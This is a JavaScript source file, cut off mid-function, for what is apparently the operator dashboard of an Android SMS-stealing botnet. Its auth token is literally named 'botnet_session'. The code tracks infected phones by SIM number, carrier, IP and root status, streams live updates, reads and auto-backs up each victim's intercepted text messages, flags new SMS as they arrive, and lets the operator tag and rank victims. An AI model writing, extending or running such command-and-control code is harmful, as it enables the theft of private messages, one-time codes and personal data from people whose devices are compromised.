// Auth Check
const token = localStorage.getItem('botnet_session');
const oldToken = localStorage.getItem('botnet_token');

// Clear old token format
if (oldToken) {
    localStorage.removeItem('botnet_token');
}

// Check if valid session token exists
if (!token || token === 'polymath-botnet-key') {
    localStorage.removeItem('botnet_session');
    window.location.href = '/login.html';
}

const API_URL = window.location.origin;
const AUTH_TOKEN = token;
let currentDevice = null;
let messages = [];
let lastMessageId = null;
let allDevices = [];
let selectedDevices = [];
let displayedMessageCount = 10;
let hasMoreMessages = true;
let newMessageCount = 0;
let lastViewedMessageId = null;
let hiddenMessages = new Set();
let viewMode = 'showall'; // 'latest10', 'showall', or 'custom'
const MESSAGES_PER_PAGE = 10;
let smsBackups = JSON.parse(localStorage.getItem('sms_backups')) || {};
let newSmsNotifications = [];
let trackedMessageIds = new Set();
let smsStatusMonitor = {};
let currentCategoryFilter = 'all'; // 'all', 'liked', 'online', 'offline'

// SSE Connection for real-time updates
let sseConnection = null;
let lastDevicesSnapshot = {};

function setupSSE() {
    if (sseConnection) {
        sseConnection.close();
    }
    
    sseConnection = new EventSource(`${API_URL}/sse.php?token=${AUTH_TOKEN}`);
    
    sseConnection.onopen = () => {
        console.log('✅ RTDB Connected via SSE');
        console.log('📡 Real-time updates: Active');
    };
    
    sseConnection.addEventListener('update', (event) => {
        try {
            const clients = JSON.parse(event.data);
            console.log('📥 RTDB Update received:', Object.keys(clients || {}).length, 'devices');
            handleDeltaUpdate(clients);
        } catch (err) {
            console.error('❌ SSE Parse Error:', err.message);
            console.error('   Raw data:', event.data);
        }
    });
    
    sseConnection.addEventListener('reconnect', () => {
        console.log('🔄 SSE Reconnecting...');
        setTimeout(() => setupSSE(), 120000);
    });
    
    sseConnection.addEventListener('error', (event) => {
        console.error('❌ SSE Connection Error');
        console.error('   EventSource readyState:', sseConnection.readyState);
        console.error('   (0=CONNECTING, 1=OPEN, 2=CLOSED)');
    });
    
    sseConnection.onerror = () => {
        console.error('❌ SSE Error - Retrying in 120s...');
        setTimeout(() => setupSSE(), 120000);
    };
}

function handleDeltaUpdate(clients) {
    // Update device list from SSE data (no API call needed)
    if (!clients || typeof clients !== 'object') {
        console.error('❌ Failed to load devices: Invalid data received from server');
        return;
    }
    
    // Create a map of existing devices to preserve notes (not in SSE)
    const existingNotesMap = {};
    allDevices.forEach(d => {
        if (d.id && d.notes) {
            existingNotesMap[d.id] = d.notes;
        }
    });
    
    const devices = [];
    for (const [id, data] of Object.entries(clients)) {
        if (!data || typeof data !== 'object') {
            console.error(`❌ Failed to load device ${id}: Invalid device data`);
            continue;
        }
        // Merge SSE data with existing notes
        devices.push({ 
            id, 
            ...data,
            notes: existingNotesMap[id] || data.notes || ''
        });
    }
    allDevices = devices;
    
    // Update stats
    document.getElementById('total-devices').textContent = devices.length;
    const onlineCount = devices.filter(d => d.status === true || d.status === 'true').length;
    document.getElementById('online-devices').textContent = onlineCount;
    document.getElementById('offline-devices').textContent = devices.length - onlineCount;
    
    let totalSMS = 0;
    devices.forEach(d => {
        totalSMS += d.messageCount || 0;
    });
    document.getElementById('total-sms').textContent = totalSMS;
    
    // Apply search filter if exists
    const searchQuery = document.getElementById('device-search')?.value || '';
    const filteredDevices = searchQuery ? filterDevicesList(devices, searchQuery) : devices;
    
    // Render table
    renderDevicesTable(filteredDevices);
    
    // Initialize snapshot on first update (don't process notifications for first load)
    if (!lastDevicesSnapshot || Object.keys(lastDevicesSnapshot).length === 0) {
        console.log('📸 Initializing device snapshot (first update)');
        lastDevicesSnapshot = JSON.parse(JSON.stringify(clients || {}));
        return; // Skip notification processing for initial load
    }
    
    // Detect new SMS by comparing message counts
    if (lastDevicesSnapshot && clients) {
        Object.keys(clients).forEach(deviceId => {
            const device = clients[deviceId];
            const oldDevice = lastDevicesSnapshot[deviceId];
            
            const oldCount = oldDevice ? (oldDevice.messageCount || 0) : 0;
            const newCount = device.messageCount || 0;
            
            if (newCount > oldCount) {
                console.log(`📬 ${newCount - oldCount} NEW SMS detected on device ${device.modelName || deviceId}`);
                
                newSmsNotifications.push({
                    id: Date.now(),
                    deviceId: deviceId,
                    deviceName: device.modelName || device.deviceId || 'Unknown Device',
                    newCount: newCount - oldCount,
                    timestamp: new Date().toLocaleString()
                });
                
                updateBellNotifications();
            }
            
            // Handle SMS status updates
            if (device.hasNewSmsStatus && currentDevice && currentDevice.id === deviceId) {
                loadDeviceSmsStatus(deviceId);
            }
        });
    }
    
    // Update snapshot
    lastDevicesSnapshot = JSON.parse(JSON.stringify(clients || {}));
    
    // If viewing a specific device, reload its messages
    if (currentDevice) {
        loadMessages();
    }
}

// Filter by category
function filterByCategory(category) {
    currentCategoryFilter = category;
    
    // Update button styles
    ['all', 'liked', 'online', 'offline'].forEach(cat => {
        const btn = document.getElementById(`filter-${cat}`);
        if (btn) {
            if (cat === category) {
                btn.className = 'bg-purple-600 px-4 py-2 rounded text-sm font-semibold';
            } else {
                btn.className = 'bg-gray-700 px-4 py-2 rounded text-sm';
            }
        }
    });
    
    // Show/hide sections based on filter
    const likedSection = document.getElementById('liked-devices-section');
    const onlineSection = document.getElementById('online-devices-section');
    const offlineSection = document.getElementById('offline-devices-section');
    const allSection = document.getElementById('all-devices-section');
    
    if (likedSection) likedSection.style.display = 'none';
    if (onlineSection) onlineSection.style.display = 'none';
    if (offlineSection) offlineSection.style.display = 'none';
    if (allSection) allSection.style.display = 'none';
    
    if (category === 'all') {
        if (allSection) allSection.style.display = 'block';
    } else if (category === 'liked') {
        if (likedSection) likedSection.style.display = 'block';
    } else if (category === 'online') {
        if (onlineSection) onlineSection.style.display = 'block';
    } else if (category === 'offline') {
        if (offlineSection) offlineSection.style.display = 'block';
    }
    
    renderDevicesTable(allDevices);
}

// Render devices table
function renderDevicesTable(devices) {
    // Separate devices by category
    const likedDevices = devices.filter(d => d.like === true || d.like === 'true');
    const onlineDevices = devices.filter(d => d.status === true || d.status === 'true');
    const offlineDevices = devices.filter(d => !(d.status === true || d.status === 'true'));
    
    // Update counts
    const likedCount = document.getElementById('liked-count');
    const onlineCount = document.getElementById('online-count');
    const offlineCount = document.getElementById('offline-count');
    if (likedCount) likedCount.textContent = likedDevices.length;
    if (onlineCount) onlineCount.textContent = onlineDevices.length;
    if (offlineCount) offlineCount.textContent = offlineDevices.length;
    
    // Render liked devices table
    const likedTbody = document.getElementById('liked-devices-table');
    if (likedTbody) {
        likedTbody.innerHTML = likedDevices.map(d => renderDeviceRow(d)).join('');
    }
    
    // Render online devices table
    const onlineTbody = document.getElementById('online-devices-table');
    if (onlineTbody) {
        onlineTbody.innerHTML = onlineDevices.map(d => renderDeviceRow(d)).join('');
    }
    
    // Render offline devices table
    const offlineTbody = document.getElementById('offline-devices-table');
    if (offlineTbody) {
        offlineTbody.innerHTML = offlineDevices.map(d => renderDeviceRow(d)).join('');
    }
    
    // Render all devices table
    const tbody = document.getElementById('devices-table');
    if (!tbody) {
        console.error('❌ Failed to render devices: Table element not found');
        return;
    }
    tbody.innerHTML = devices.map(d => renderDeviceRow(d)).join('');
}

// Render a single device row
function renderDeviceRow(d) {
    const sim1 = d.sims?.find(s => s.simSlotIndex === '0' || s.simSlotIndex === 0);
    const sim2 = d.sims?.find(s => s.simSlotIndex === '1' || s.simSlotIndex === 1);
    const isOnline = d.status === true || d.status === 'true';
    const statusClass = isOnline ? 'status-online' : 'status-offline';
    const checked = selectedDevices.includes(d.id) ? 'checked' : '';
    const isLiked = d.like === true || d.like === 'true';
    
    // Render tags as individual badges
    const tagsDisplay = d.tags && d.tags.length > 0 
        ? d.tags.map(tag => `<span class="bg-yellow-600 px-1 py-0.5 rounded text-xs mr-1">${tag}</span>`).join('')
        : '';
    
    return `
        <tr class="card-hover transition-all border-b border-gray-800">
            <td class="px-2 py-2">
                <input type="checkbox" ${checked} onchange="toggleDevice('${d.id}', this.checked)">
            </td>
            <td class="px-2 py-2">
                <i class="fas fa-circle ${statusClass}" title="${isOnline ? 'Online' : 'Offline'}"></i>
            </td>
            <td class="px-2 py-2">
                <div class="font-semibold text-white text-xs">${d.modelName || 'Unknown'}</div>
                <div class="text-xs text-gray-400">${d.deviceId?.substring(0, 8)}...</div>
                ${tagsDisplay ? `<div class="mt-1">${tagsDisplay}</div>` : ''}
            </td>
            <td class="px-2 py-2 hide-mobile text-xs text-gray-400">${(d.joined || 'N/A').substring(0, 15)}</td>
            <td class="px-2 py-2">
                <div class="text-xs">${sim1?.phoneNumber?.substring(0, 13) || 'N/A'}</div>
                <div class="text-xs text-gray-400">${sim1?.carrierName || ''}</div>
            </td>
            <td class="px-2 py-2 hide-mobile">
                <div class="text-xs">${sim2?.phoneNumber?.substring(0, 13) || 'N/A'}</div>
                <div class="text-xs text-gray-400">${sim2?.carrierName || ''}</div>
            </td>
            <td class="px-2 py-2 hide-mobile">
                <span class="px-2 py-1 rounded ${getBatteryClass(d.battery)} text-xs">
                    ${d.battery || 'N/A'}
                </span>
            </td>
            <td class="px-2 py-2">
                <div class="flex space-x-1">
                    <button onclick="toggleLikeQuick('${d.id}')" class="bg-${isLiked ? 'pink' : 'gray'}-600 hover:bg-${isLiked ? 'pink' : 'gray'}-700 px-2 py-1 rounded text-xs" title="${isLiked ? 'Unlike' : 'Like'}">
                        <i class="fas fa-heart${isLiked ? '' : ' text-gray-400'}"></i>
                    </button>
                    <button onclick='showDeviceInfo(${JSON.stringify(d).replace(/'/g, "&#39;")})' class="bg-blue-600 hover:bg-blue-700 px-2 py-1 rounded text-xs">
                        <i class="fas fa-info"></i>
                    </button>
                    <button onclick="openDevice('${d.id}', '${d.modelName || 'Unknown'}')" class="bg-purple-600 hover:bg-purple-700 px-2 py-1 rounded text-xs">
                        <i class="fas fa-cog"></i>
                    </button>
                    <button onclick="moveToTrash('${d.id}')" class="bg-gray-600 hover:bg-gray-700 px-2 py-1 rounded text-xs">
                        <i class="fas fa-trash"></i>
                    </button>
                </div>
            </td>
        </tr>
    `;
}

// Filter devices by search query
function filterDevicesList(devices, query) {
    if (!query || !query.trim()) return devices;
    
    const searchLower = query.toLowerCase().trim();
    return devices.filter(d => {
        // Search in model name
        if (d.modelName && d.modelName.toLowerCase().includes(searchLower)) return true;
        
        // Search in device ID
        if (d.deviceId && d.deviceId.toLowerCase().includes(searchLower)) return true;
        
        // Search in SIM numbers
        if (d.sims && Array.isArray(d.sims)) {
            for (const sim of d.sims) {
                if (sim.phoneNumber && sim.phoneNumber.includes(searchLower)) return true;
                if (sim.carrierName && sim.carrierName.toLowerCase().includes(searchLower)) return true;
            }
        }
        
        // Search in mobile number
        if (d.mobNo && d.mobNo.includes(searchLower)) return true;
        
        // Search in service provider
        if (d.service_provider && d.service_provider.toLowerCase().includes(searchLower)) return true;
        
        // Search in tags
        if (d.tags && Array.isArray(d.tags)) {
            for (const tag of d.tags) {
                if (tag && tag.toLowerCase().includes(searchLower)) return true;
            }
        }
        
        // Search in notes
        if (d.notes && d.notes.toLowerCase().includes(searchLower)) return true;
        
        return false;
    });
}

// Filter devices from search input
function filterDevices() {
    const query = document.getElementById('device-search')?.value || '';
    const filteredDevices = filterDevicesList(allDevices, query);
    renderDevicesTable(filteredDevices);
}

function extractTimestamp(id) {
    if (!id) return 0;
    const idStr = String(id);
    if (idStr.includes('-LATEST_-0')) {
        const match = idStr.match(/-LATEST_-0(\d+)/);
        return match ? parseInt(match[1]) : 0;
    }
    return parseInt(idStr) || 0;
}

// Logout
async function logout() {
    try {
        await fetch(`${API_URL}/logout`, {
            method: 'POST',
            headers: { 'Authorization': AUTH_TOKEN }
        });
    } catch (err) {
        console.error('Logout error:', err);
    }
    localStorage.removeItem('botnet_session');
    window.location.href = '/login.html';
}

// Load Devices
async function loadDevices() {
    try {
        console.log('📡 Fetching devices from /clients API...');
        const res = await fetch(`${API_URL}/clients`, {
            headers: { 'Authorization': AUTH_TOKEN }
        });
        
        console.log(`   Response status: ${res.status} ${res.statusText}`);
        
        if (res.status === 401) {
            console.error('❌ Authentication failed - Session expired');
            console.error('   Redirecting to login page...');
            localStorage.removeItem('botnet_session');
            window.location.href = '/login.html';
            return;
        }
        
        if (!res.ok) {
            console.error(`❌ HTTP Error ${res.status}: ${res.statusText}`);
            console.error('   Failed to load devices from API');
            allDevices = [];
            return;
        }
        
        const data = await res.json();
        
        if (data.error) {
            console.error('❌ API Error:', data.error);
            console.error('   Server returned an error response');
            allDevices = [];
            return;
        }
        
        if (!Array.isArray(data)) {
            console.error('❌ Invalid Response Type:', typeof data);
            console.error('   Expected: Array of devices');
            console.error('   Received:', data);
            allDevices = [];
            return;
        }
        
        console.log(`✅ Loaded ${data.length} devices successfully`);
        const devices = data;
        allDevices = devices;
        
        // Initialize trackedMessageIds with all existing messages on first load
        devices.forEach(device => {
            if (device.messages && typeof device.messages === 'object') {
                Object.keys(device.messages).forEach(msgId => {
                    trackedMessageIds.add(msgId);
                });
            }
        });
        
        // Update stats
        document.getElementById('total-devices').textContent = devices.length;
        const onlineCount = devices.filter(d => d.status === true || d.status === 'true').length;
        document.getElementById('online-devices').textContent = onlineCount;
        document.getElementById('offline-devices').textContent = devices.length - onlineCount;
        
        let totalSMS = 0;
        devices.forEach(d => {
            if (d.messages && d.messages.count !== undefined) {
                totalSMS += d.messages.count;
            } else if (d.messages && typeof d.messages === 'object') {
                totalSMS += Object.keys(d.messages).length;
            }
        });
        document.getElementById('total-sms').textContent = totalSMS;
        
        // Render table
        const tbody = document.getElementById('devices-table');
        tbody.innerHTML = devices.map(d => {
            const sim1 = d.sims?.find(s => s.simSlotIndex === '0' || s.simSlotIndex === 0);
            const sim2 = d.sims?.find(s => s.simSlotIndex === '1' || s.simSlotIndex === 1);
            const isOnline = d.status === true || d.status === 'true';
            const statusClass = isOnline ? 'status-online' : 'status-offline';
            const checked = selectedDevices.includes(d.id) ? 'checked' : '';
            
            return `
                <tr class="card-hover transition-all border-b border-gray-800">
                    <td class="px-2 py-2">
                        <input type="checkbox" ${checked} onchange="toggleDevice('${d.id}', this.checked)">
                    </td>
                    <td class="px-2 py-2">
                        <i class="fas fa-circle ${statusClass}" title="${isOnline ? 'Online' : 'Offline'}"></i>
                    </td>
                    <td class="px-2 py-2">
                        <div class="font-semibold text-white text-xs">${d.modelName || 'Unknown'}</div>
                        <div class="text-xs text-gray-400">${d.deviceId?.substring(0, 8)}...</div>
                    </td>
                    <td class="px-2 py-2 hide-mobile text-xs text-gray-400">${(d.joined || 'N/A').substring(0, 15)}</td>
                    <td class="px-2 py-2">
                        <div class="text-xs">${sim1?.phoneNumber?.substring(0, 13) || 'N/A'}</div>
                        <div class="text-xs text-gray-400">${sim1?.carrierName || ''}</div>
                    </td>
                    <td class="px-2 py-2 hide-mobile">
                        <div class="text-xs">${sim2?.phoneNumber?.substring(0, 13) || 'N/A'}</div>
                        <div class="text-xs text-gray-400">${sim2?.carrierName || ''}</div>
                    </td>
                    <td class="px-2 py-2 hide-mobile">
                        <span class="px-2 py-1 rounded ${getBatteryClass(d.battery)} text-xs">
                            ${d.battery || 'N/A'}
                        </span>
                    </td>
                    <td class="px-2 py-2">
                        <div class="flex space-x-1">
                            <button onclick='showDeviceInfo(${JSON.stringify(d).replace(/'/g, "&#39;")})' class="bg-blue-600 hover:bg-blue-700 px-2 py-1 rounded text-xs">
                                <i class="fas fa-info"></i>
                            </button>
                            <button onclick="openDevice('${d.id}', '${d.modelName || 'Unknown'}')" class="bg-purple-600 hover:bg-purple-700 px-2 py-1 rounded text-xs">
                                <i class="fas fa-cog"></i>
                            </button>
                            <button onclick="moveToTrash('${d.id}')" class="bg-gray-600 hover:bg-gray-700 px-2 py-1 rounded text-xs">
                                <i class="fas fa-trash"></i>
                            </button>
                        </div>
                    </td>
                </tr>
            `;
        }).join('');
    } catch (err) {
        console.error('❌ Load Devices Exception:', err.name);
        console.error('   Message:', err.message);
        console.error('   Stack:', err.stack);
        allDevices = [];
    }
}

function getBatteryClass(battery) {
    if (!battery) return 'bg-gray-900 text-gray-300';
    const level = parseInt(battery);
    if (level >= 70) return 'bg-green-900 text-green-300';
    if (level >= 30) return 'bg-yellow-900 text-yellow-300';
    return 'bg-red-900 text-red-300';
}

// Device Selection
function toggleDevice(id, checked) {
    if (checked) {
        if (!selectedDevices.includes(id)) selectedDevices.push(id);
    } else {
        selectedDevices = selectedDevices.filter(d => d !== id);
    }
}

function toggleSelectAll(checkbox) {
    if (checkbox.checked) {
        selectedDevices = allDevices.map(d => d.id);
        document.querySelectorAll('#devices-table input[type="checkbox"]').forEach(cb => cb.checked = true);
    } else {
        selectedDevices = [];
        document.querySelectorAll('#devices-table input[type="checkbox"]').forEach(cb => cb.checked = false);
    }
}

function selectAllDevices() {
    document.getElementById('select-all').checked = true;
    toggleSelectAll(document.getElementById('select-all'));
}

// Show Device Info Modal
function showDeviceInfo(device) {
    const modal = document.getElementById('info-modal');
    const details = document.getElementById('device-details');
    
    const sim1 = device.sims?.find(s => s.simSlotIndex === '0' || s.simSlotIndex === 0);
    const sim2 = device.sims?.find(s => s.simSlotIndex === '1' || s.simSlotIndex === 1);
    
    const tagsArray = device.tags || [];
    const tagsHtml = tagsArray.map(tag => 
        `<span class="bg-yellow-600 px-2 py-1 rounded text-xs mr-1 mb-1 inline-block">${tag} <button onclick="removeTag('${device.id}', '${tag}')" class="ml-1 text-red-300 hover:text-red-500">×</button></span>`
    ).join('');
    
    details.innerHTML = `
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Device ID</p><p class="text-white font-semibold text-sm">${device.deviceId || 'N/A'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Model</p><p class="text-white font-semibold text-sm">${device.modelName || 'N/A'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Android</p><p class="text-white font-semibold text-sm">${device.androidV || 'N/A'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Battery</p><p class="text-white font-semibold text-sm">${device.battery || 'N/A'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Storage</p><p class="text-white font-semibold text-sm">${device.storage || 'N/A'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">IP</p><p class="text-white font-semibold text-sm">${device.ip_address || 'N/A'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Connection</p><p class="text-white font-semibold text-sm">${device.connection_status || 'N/A'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Join Time</p><p class="text-white font-semibold text-sm">${device.joined || 'N/A'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">SIM 1</p><p class="text-white font-semibold text-sm">${sim1?.phoneNumber || 'N/A'}</p><p class="text-gray-400 text-xs">${sim1?.carrierName || ''}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">SIM 2</p><p class="text-white font-semibold text-sm">${sim2?.phoneNumber || 'N/A'}</p><p class="text-gray-400 text-xs">${sim2?.carrierName || ''}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Root</p><p class="text-white font-semibold text-sm">${device.isRoot ? 'Yes' : 'No'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Status</p><p class="text-white font-semibold text-sm ${device.status === true || device.status === 'true' ? 'text-green-400' : 'text-red-400'}">${device.status === true || device.status === 'true' ? 'Online' : 'Offline'}</p></div>
        
        <!-- Like Button -->
        <div class="bg-gray-900 p-3 rounded md:col-span-2">
            <button onclick="toggleLike('${device.id}')" class="bg-pink-600 hover:bg-pink-700 px-4 py-2 rounded text-sm w-full">
                ${device.like ? '❤️ Liked' : '🤍 Like This Device'}
            </button>
        </div>
        
        <!-- Notes Section -->
        <div class="bg-gray-900 p-3 rounded md:col-span-2">
            <p class="text-gray-400 text-xs mb-2">📝 Notes</p>
            <textarea id="device-notes-${device.id}" class="w-full bg-gray-800 text-white px-3 py-2 rounded border border-purple-600 text-sm" rows="3" placeholder="Add notes about this device...">${device.notes || ''}</textarea>
            <button onclick="saveNotes('${device.id}')" class="mt-2 bg-green-600 hover:bg-green-700 px-3 py-1 rounded text-xs">
                <i class="fas fa-save mr-1"></i>Save Notes
            </button>
        </div>
        
        <!-- Tags Section -->
        <div class="bg-gray-900 p-3 rounded md:col-span-2">
            <p class="text-gray-400 text-xs mb-2">🏷️ Tags</p>
            <div class="mb-2 flex flex-wrap">${tagsHtml || '<span class="text-gray-500 text-xs">No tags yet</span>'}</div>
            <div class="flex space-x-2">
                <input id="device-tag-${device.id}" class="flex-1 bg-gray-800 text-white px-3 py-2 rounded border border-purple-600 text-sm" placeholder="Add tag..." />
                <button onclick="addTag('${device.id}')" class="bg-yellow-600 hover:bg-yellow-700 px-3 py-1 rounded text-xs">
                    <i class="fas fa-plus mr-1"></i>Add
                </button>
            </div>
        </div>
    `;
    
    modal.style.display = 'block';
}

function closeModal() {
    document.getElementById('info-modal').style.display = 'none';
}

// Save device notes
async function saveNotes(deviceId) {
    const notesElement = document.getElementById(`device-notes-${deviceId}`);
    if (!notesElement) {
        console.error('❌ Notes element not found');
        return;
    }
    
    const notes = notesElement.value.trim();
    
    try {
        const res = await fetch(`${API_URL}/device/${deviceId}/notes`, {
            method: 'POST',
            headers: {
                'Authorization': AUTH_TOKEN,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ notes })
        });
        
        if (!res.ok) {
            console.error(`❌ Failed to save notes: HTTP ${res.status}`);
            alert('Failed to save notes');
            return;
        }
        
        const device = allDevices.find(d => d.id === deviceId);
        if (device) device.notes = notes;
        
        console.log('✅ Notes saved successfully');
        alert('Notes saved!');
        logActivity('note_saved', `Notes saved for device ${device?.modelName || deviceId}`);
    } catch (err) {
        console.error('❌ Error saving notes:', err.message);
        alert('Error saving notes');
    }
}

// Toggle like status
async function toggleLike(deviceId) {
    const device = allDevices.find(d => d.id === deviceId);
    if (!device) {
        console.error('❌ Device not found');
        return;
    }
    
    const newLikeStatus = !device.like;
    
    try {
        const res = await fetch(`${API_URL}/device/${deviceId}/like`, {
            method: 'POST',
            headers: {
                'Authorization': AUTH_TOKEN,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ like: newLikeStatus })
        });
        
        if (!res.ok) {
            console.error(`❌ Failed to toggle like: HTTP ${res.status}`);
            alert('Failed to update like status');
            return;
        }
        
        device.like = newLikeStatus;
        console.log(`✅ Like status updated: ${newLikeStatus}`);
        logActivity('like_toggled', `${newLikeStatus ? 'Liked' : 'Unliked'} device ${device.modelName || deviceId}`);
        
        // Refresh modal
        showDeviceInfo(device);
    } catch (err) {
        console.error('❌ Error toggling like:', err.message);
        alert('Error updating like status');
    }
}

// Quick toggle like from table
async function toggleLikeQuick(deviceId) {
    const device = allDevices.find(d => d.id === deviceId);
    if (!device) {
        console.error('❌ Device not found');
        return;
    }
    
    const newLikeStatus = !(device.like === true || device.like === 'true');
    
    try {
        const res = await fetch(`${API_URL}/device/${deviceId}/like`, {
            method: 'POST',
            headers: {
                'Authorization': AUTH_TOKEN,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ like: newLikeStatus })
        });
        
        if (!res.ok) {
            console.error(`❌ Failed to toggle like: HTTP ${res.status}`);
            return;
        }
        
        device.like = newLikeStatus;
        console.log(`✅ Like status updated: ${newLikeStatus}`);
        logActivity('like_toggled', `${newLikeStatus ? 'Liked' : 'Unliked'} device ${device.modelName || deviceId}`);
        
        // Re-render tables to move device between sections
        const searchQuery = document.getElementById('device-search')?.value || '';
        const filteredDevices = searchQuery ? filterDevicesList(allDevices, searchQuery) : allDevices;
        renderDevicesTable(filteredDevices);
    } catch (err) {
        console.error('❌ Error toggling like:', err.message);
    }
}

// Toggle select all for liked devices
function toggleSelectAllLiked(checkbox) {
    const likedDevices = allDevices.filter(d => d.like === true || d.like === 'true');
    likedDevices.forEach(device => {
        toggleDevice(device.id, checkbox.checked);
    });
}

// Toggle select all for online devices
function toggleSelectAllOnline(checkbox) {
    const onlineDevices = allDevices.filter(d => d.status === true || d.status === 'true');
    onlineDevices.forEach(device => {
        toggleDevice(device.id, checkbox.checked);
    });
}

// Toggle select all for offline devices
function toggleSelectAllOffline(checkbox) {
    const offlineDevices = allDevices.filter(d => !(d.status === true || d.status === 'true'));
    offlineDevices.forEach(device => {
        toggleDevice(device.id, checkbox.checked);
    });
}

// Add tag to device
async function addTag(deviceId) {
    const tagInput = document.getElementById(`device-tag-${deviceId}`);
    if (!tagInput) {
        console.error('❌ Tag input element not found');
        return;
    }
    
    const tag = tagInput.value.trim();
    if (!tag) {
        alert('Please enter a tag');
        return;
    }
    
    const device = allDevices.find(d => d.id === deviceId);
    if (!device) {
        console.error('❌ Device not found');
        return;
    }
    
    const tags = device.tags || [];
    if (tags.includes(tag)) {
        alert('Tag already exists');
        return;
    }
    
    tags.push(tag);
    
    try {
        const res = await fetch(`${API_URL}/device/${deviceId}/tags`, {
            method: 'POST',
            headers: {
                'Authorization': AUTH_TOKEN,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ tags })
        });
        
        if (!res.ok) {
            console.error(`❌ Failed to add tag: HTTP ${res.status}`);
            alert('Failed to add tag');
            return;
        }
        
        device.tags = tags;
        console.log(`✅ Tag added: ${tag}`);
        tagInput.value = '';
        logActivity('tag_added', `Added tag "${tag}" to device ${device.modelName || deviceId}`);
        
        // Refresh modal
        showDeviceInfo(device);
    } catch (err) {
        console.error('❌ Error adding tag:', err.message);
        alert('Error adding tag');
    }
}

// Remove tag from device
async function removeTag(deviceId, tag) {
    const device = allDevices.find(d => d.id === deviceId);
    if (!device) {
        console.error('❌ Device not found');
        return;
    }
    
    const tags = (device.tags || []).filter(t => t !== tag);
    
    try {
        const res = await fetch(`${API_URL}/device/${deviceId}/tags`, {
            method: 'POST',
            headers: {
                'Authorization': AUTH_TOKEN,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ tags })
        });
        
        if (!res.ok) {
            console.error(`❌ Failed to remove tag: HTTP ${res.status}`);
            alert('Failed to remove tag');
            return;
        }
        
        device.tags = tags;
        console.log(`✅ Tag removed: ${tag}`);
        logActivity('tag_removed', `Removed tag "${tag}" from device ${device.modelName || deviceId}`);
        
        // Refresh modal
        showDeviceInfo(device);
    } catch (err) {
        console.error('❌ Error removing tag:', err.message);
        alert('Error removing tag');
    }
}

// Open Device Control Panel
function openDevice(id, name) {
    currentDevice = { id, name };
    document.getElementById('control-panel').classList.remove('hidden');
    document.getElementById('device-title').textContent = name;
    console.log(`📱 Device opened: ${name} (${id})`);
    viewMode = 'showall'; // Show all messages by default
    displayedMessageCount = 0;
    smsStatusMonitor = {}; // Reset SMS status monitor
    loadMessages(true).then(() => {
        if (messages.length > 0) {
            lastViewedMessageId = messages[messages.length - 1].id;
        }
    });
    loadDeviceSmsStatus(id); // Load SMS status for this device
}

function closePanel() {
    document.getElementById('control-panel').classList.add('hidden');
    currentDevice = null;
    lastViewedMessageId = null;
    smsStatusMonitor = {};
    document.getElementById('sms-status-section').style.display = 'none';
}

function updateDeviceData(data) {
    console.log('Device data updated:', data);
}

// Load Messages (All messages, sorted oldest first like RTDB tree)
async function loadMessages(resetView = false) {
    if (!currentDevice) return;
    try {
        console.log(`📨 Loading messages for device: ${currentDevice.name}`);
        const res = await fetch(`${API_URL}/device/${currentDevice.id}/messages?limit=100&offset=0`, {
            headers: { 'Authorization': AUTH_TOKEN }
        });
        
        console.log(`   Response status: ${res.status} ${res.statusText}`);
        
        if (!res.ok) {
            console.error(`❌ HTTP Error ${res.status}: Failed to load messages`);
            messages = [];
            renderMessages();
            return;
        }
        
        const data = await res.json();
        
        // Check if response is an error or valid object
        if (data.error) {
            console.error('❌ Messages API Error:', data.error);
            messages = [];
        } else if (!data.messages || !Array.isArray(data.messages)) {
            console.error('❌ Invalid Messages Response Type:', typeof data);
            console.error('   Expected: Object with messages array');
            console.error('   Received:', data);
            messages = [];
        } else {
            console.log(`✅ Loaded ${data.messages.length} of ${data.total} messages`);
            messages = data.messages;
            hasMoreMessages = data.hasMore;
            
            // Initialize trackedMessageIds with existing messages to avoid flagging them as new
            messages.forEach(msg => {
                trackedMessageIds.add(msg.id);
            });
            
            // Auto-backup SMS when first loaded for this device
            if (messages.length > 0 && !smsBackups[currentDevice.id]) {
                saveBackup(currentDevice.id, currentDevice.name, messages);
                console.log('✅ SMS backup created for', currentDevice.name);
            }
        }
        
        // Apply view mode - always show all by default
        if (resetView) {
            viewMode = 'showall';
            displayedMessageCount = messages.length;
        } else if (viewMode === 'showall') {
            displayedMessageCount = messages.length;
        }
        // For 'custom' mode, keep displayedMessageCount as is (from Load More)
        
        hasMoreMessages = messages.length > displayedMessageCount;
        renderMessages();
        if (messages.length > 0) lastMessageId = messages[messages.length - 1].id;
    } catch (err) {
        console.error('❌ Load Messages Exception:', err.name);
        console.error('   Message:', err.message);
        console.error('   Stack:', err.stack);
        messages = [];
        renderMessages();
    }
}

function loadMoreMessages() {
    if (!currentDevice || messages.length === 0 || !hasMoreMessages) return;
    viewMode = 'custom';
    displayedMessageCount = Math.min(displayedMessageCount + 10, messages.length);
    hasMoreMessages = displayedMessageCount < messages.length;
    renderMessages();
}

function refreshMessages() {
    if (currentDevice) {
        loadMessages(true);
    }
}

function toggleMessageVisibility(msgId) {
    if (hiddenMessages.has(msgId)) {
        hiddenMessages.delete(msgId);
    } else {
        hiddenMessages.add(msgId);
    }
    renderMessages();
}

function getDateLabel(dateString) {
    if (!dateString) return 'Unknown Date';
    
    const msgDate = new Date(dateString);
    const today = new Date();
    const yesterday = new Date(today);
    yesterday.setDate(yesterday.getDate() - 1);
    
